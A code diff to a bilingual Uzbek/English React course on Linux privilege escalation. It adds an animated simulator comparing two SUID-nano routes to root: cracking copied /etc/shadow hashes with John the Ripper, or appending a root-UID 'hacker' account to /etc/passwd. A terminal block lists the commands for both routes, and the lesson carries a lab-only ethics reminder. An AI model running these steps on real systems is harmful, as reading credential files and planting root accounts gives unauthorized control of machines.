@@ -1668,6 +1668,46 @@ function EnvKeepSim(){
       React.createElement("button",{onClick:()=>{setRun("preserved");setStep(-1);},style:{flex:1,padding:"9px",background:run==="preserved"?D+"22":SL2,color:run==="preserved"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"☠ env_keep+=LD_PRELOAD bor","☠ env_keep+=LD_PRELOAD set"))));
 }
 
+function SUIDPathSim(){
+  const lang=useLang();
+  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
+  const CRACK=[
+    {col:BL,uz:"SUID nano orqali /etc/shadow va /etc/passwd nusxalanadi",en:"/etc/shadow and /etc/passwd are copied via SUID nano",duz:"Xuddi shu boshlang'ich imkoniyat — SUID nano orqali istalgan faylni o'qish.",den:"The same starting capability — reading any file via SUID nano."},
+    {col:AM,uz:"unshadow bilan birlashtiriladi, John the Ripper ishga tushiriladi",en:"unshadow merges them, John the Ripper is launched",duz:"Endi tashqi omilga — parol kuchiga — bog'liq bosqich boshlanadi.",den:"Now a stage begins that depends on an outside factor: password strength."},
+    {col:AM,uz:"Parol kuchli bo'lsa — soatlab yoki hech qachon buzilmasligi mumkin",en:"If the password is strong, it may take hours — or never crack at all",duz:"Bu yo'l root egasining parol tanlovi natijasiga qaram.",den:"This path's outcome depends on how the root owner chose their password."},
+    {col:D,uz:"⏳ Natija kafolatlanmagan — parol kuchiga bog'liq",en:"⏳ Not guaranteed — the outcome hinges on password strength",duz:"Ishlashi mumkin, lekin vaqt va muvaffaqiyat kafolatlanmagan.",den:"It might work, but neither time nor success is guaranteed.",final:true,bad:true}
+  ];
+  const DIRECT=[
+    {col:BL,uz:"SUID nano orqali /etc/passwd tahrirlash uchun ochiladi",en:"/etc/passwd is opened for editing via SUID nano",duz:"Xuddi shu boshlang'ich imkoniyat, boshqacha maqsad.",den:"The same starting capability, a different goal."},
+    {col:AM,uz:"openssl passwd bilan yangi xesh yaratilib, hacker:...:0:0:root qatori qo'shiladi",en:"openssl passwd generates a new hash, and a hacker:...:0:0:root line is appended",duz:"Mavjud parolni buzish emas — o'zimizning yangi hisobimizni yaratamiz.",den:"Not cracking an existing password — creating our own new account."},
+    {col:AM,uz:"su hacker — darhol yangi hisobga o'tiladi",en:"su hacker — immediately switches to the new account",duz:"Hech qanday tashqi omilga bog'liq emas — hammasi bizning nazoratimizda.",den:"Nothing depends on an outside factor — it's all under our control."},
+    {col:A,uz:"⚡ Bir necha soniyada root — buzish yoki kutish shart emas",en:"⚡ Root in a few seconds — no cracking or waiting required",duz:"Xuddi shu SUID nano imkoniyati — deterministik natija.",den:"The exact same SUID nano capability — a deterministic result.",final:true}
+  ];
+  const [run,setRun]=useState(null);
+  const [step,setStep]=useState(-1);
+  useEffect(()=>{
+    if(run==null){setStep(-1);return;}
+    const list=run==="crack"?CRACK:DIRECT;
+    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
+    if(step>=list.length-1) return;
+    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
+  },[run,step]);
+  const list=run==="crack"?CRACK:run==="direct"?DIRECT:null;
+  const cur=list&&step>=0?list[step]:null;
+  return React.createElement("div",{style:{margin:"14px 0"}},
+    React.createElement("div",{style:{minHeight:50}},
+      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu SUID nano imkoniyatidan ikki xil yo'l bilan foydalaning.","⬇ Pick a scenario — use the exact same SUID nano capability two different ways.")):
+      list.map(function(s,i){ if(step<i) return null;
+        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
+          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
+          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
+    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
+      run==="crack"?t(lang,"✗ Variant 1: sekin va natija kafolatlanmagan","✗ Variant 1: slow and not guaranteed"):t(lang,"✓ Variant 2: tez va aniq natija","✓ Variant 2: fast and certain")),
+    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
+      React.createElement("button",{onClick:()=>{setRun("crack");setStep(-1);},style:{flex:1,padding:"9px",background:run==="crack"?D+"22":SL2,color:run==="crack"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🐌 Variant 1: xesh buzish","🐌 Variant 1: crack the hash")),
+      React.createElement("button",{onClick:()=>{setRun("direct");setStep(-1);},style:{flex:1,padding:"9px",background:run==="direct"?A+"22":SL2,color:run==="direct"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"⚡ Variant 2: foydalanuvchi qo'shish","⚡ Variant 2: add a user"))));
+}
+
 function LessonL01(){
   const lang=useLang();
   return React.createElement("section",null,
@@ -3203,7 +3243,10 @@ function LessonL36(){
     React.createElement(SlideImg,{src:"privesc/suid_s09_a.png",cap:"openssl passwd -1 -salt ... — yangi foydalanuvchi uchun parol xeshi yaratiladi.",capEn:"openssl passwd -1 -salt ... — generates a password hash for the new user."}),
     React.createElement(SlideImg,{src:"privesc/suid_s09_b.png",cap:"/etc/passwd ga qo'shilgan hacker qatori: xesh + 0:0 (root UID/GID) → root imtiyozli foydalanuvchi.",capEn:"The hacker line added to /etc/passwd: hash + 0:0 (root UID/GID) → a root-privileged user."}),
     React.createElement(SlideImg,{src:"privesc/suid_s10.png",cap:"su hacker → id endi uid=0(root) ni ko'rsatadi. Oddiy foydalanuvchidan root'ga o'tildi.",capEn:"su hacker → id now shows uid=0(root). We moved from a normal user to root."}),
-    React.createElement(Terminal,null,"# SUID/SGID fayllarni topish\nfind / -type f -perm -04000 -ls 2>/dev/null\n\n# Variant 1: shadow + passwd → unshadow → John\nunshadow passwd.txt shadow.txt > passwords.txt\njohn passwords.txt\n\n# Variant 2: /etc/passwd ga root foydalanuvchi qo'shish\nopenssl passwd -1 -salt THM Password123    # $1$THM$... xeshi\n# quyidagi qatorni /etc/passwd ga qo'shamiz (SUID nano bilan):\n# hacker:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash\nsu hacker      # → uid=0(root)"),
+React.createElement(H2,{num:"§5"},t(lang,"Interaktiv simulyator: qaysi yo'l tezroq?","Interactive simulator: which path is faster?")),
+    React.createElement(P,null,t(lang,"§3 va §4 dagi ikkala yo'lni to'g'ridan-to'g'ri solishtiring — bir xil SUID nano imkoniyati, ikki tubdan boshqa natija:","Compare §3 and §4's two paths head to head — the same SUID nano capability, two very different outcomes:")),
+    React.createElement(SUIDPathSim),
+        React.createElement(Terminal,null,"# SUID/SGID fayllarni topish\nfind / -type f -perm -04000 -ls 2>/dev/null\n\n# Variant 1: shadow + passwd → unshadow → John\nunshadow passwd.txt shadow.txt > passwords.txt\njohn passwords.txt\n\n# Variant 2: /etc/passwd ga root foydalanuvchi qo'shish\nopenssl passwd -1 -salt THM Password123    # $1$THM$... xeshi\n# quyidagi qatorni /etc/passwd ga qo'shamiz (SUID nano bilan):\n# hacker:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash\nsu hacker      # → uid=0(root)"),
     eth("SUID/SGID ekspluatatsiyasini faqat o'z laboratoriyangizda yoki yozma ruxsat berilgan nishonlarda sinang.","Only test SUID/SGID exploitation in your own lab or on written-authorized targets."),
     React.createElement(Quiz,{q:{uz:"SUID biti o'rnatilgan va root'ga tegishli dastur nima qiladi?",en:"What does a program with the SUID bit set and owned by root do?"},opts:[{uz:"Ishlagan vaqtda vaqtincha root (fayl egasi) huquqlari bilan ishlaydi",en:"While running, it temporarily works with root (the file owner's) privileges"},{uz:"Faqat internetni o'chiradi",en:"It only turns off the internet"},{uz:"Parolni ko'rsatadi",en:"It displays the password"},{uz:"Hech qanday ta'sir qilmaydi",en:"It has no effect"}],correct:0,exp:{uz:"SUID dastur uni ishga tushirgan foydalanuvchi emas, fayl egasining (ko'pincha root) imtiyoz darajasi bilan ishlaydi — bu privesc vektori bo'lishi mumkin.",en:"A SUID program runs with the privilege level of the file owner (often root), not the user who launched it — which can be a privesc vector."}}));
 }
